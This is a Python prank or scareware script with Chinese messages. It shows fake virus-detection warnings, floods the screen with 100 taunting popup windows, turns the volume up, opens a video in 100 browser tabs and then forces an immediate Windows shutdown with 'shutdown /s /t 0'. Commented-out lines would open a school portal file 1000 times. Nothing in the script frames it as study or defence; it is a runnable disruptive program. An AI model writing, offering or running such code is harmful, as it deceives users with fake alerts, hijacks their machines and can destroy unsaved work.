import tkinter.messagebox
import tkinter as tk
import webbrowser
import threading
import random
import os
import pyautogui
import time
window = tk.Tk()
window.title("menu")
window.geometry("200x200")


# tk.messagebox.showwarning(title = "解毒程序",message = "解毒中，这可能需要一点时间，请勿关闭此程序……")
# time.sleep(0.5)

tk.messagebox.showwarning(title = "提示",message = "打开网站中……")
time.sleep(0.2)

url = "www.baidu.com"
webbrowser.open_new_tab(url)

tk.messagebox.showwarning(title = "提示",message = "加固网站中……")
time.sleep(0.1)

tk.messagebox.showwarning(title = "WRARNING", message = "检测到不明攻击，攻击源：C:\Windows\Logs\Downlevel\CBS\virus\e.exe")
def boom():
    window = tk.Tk()
    W = window.winfo_screenwidth()
    H = window.winfo_screenheight()
    a = random.randint(0,W)
    b = random.randint(0,H)
    window.title("WARNING")
    window.geometry("300x100" + "+" + str(a) + "+" + str(b))
    txt = ["你的电脑要被我搞爆掉啦！","你是一个傻子","学学网安吧","就你还学过编程","这点网安意识都没有吗？","基尼太美","三六零安全下毒","有一个人前来卖瓜","让我看看！","啊哈哈哈鸡汤来喽"]
    tk.Label(window,text = txt[random.randint(0,len(txt)-1)],bg = "green",font = ("微软雅黑"),width = 40, height = 8).pack()
    window.mainloop()

threads = []
for i in range(100):
   t = threading.Thread(target = boom)
   threads.append(t)
   threads[i].start()
time.sleep(20)

for i in range(50):
    pyautogui.press('volumeup')    #调大音量
url = "https://www.bilibili.com/video/BV1Wx411q7Ks/"
for i in range(100):
    webbrowser.open_new_tab(url)
time.sleep(30)
os.system("shutdown /s /t 0")
##url = "https://seqta-s.saintaug.nsw.edu.au/seqta/student/load/file?type=resource&file=adca6b32-40b2-40e5-a90e-d475993a5d31"
##for i in range(1000):
##    webbrowser.open_new_tab(url)
##url = "https://seqta-s.saintaug.nsw.edu.au/seqta/student/load/file?type=resource&file=adca6b32-40b2-40e5-a90e-d475993a5d31"
##for i in range(1000):
##    webbrowser.open_new_tab(url)    


##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)
##webbrowser.open_new_tab(url)

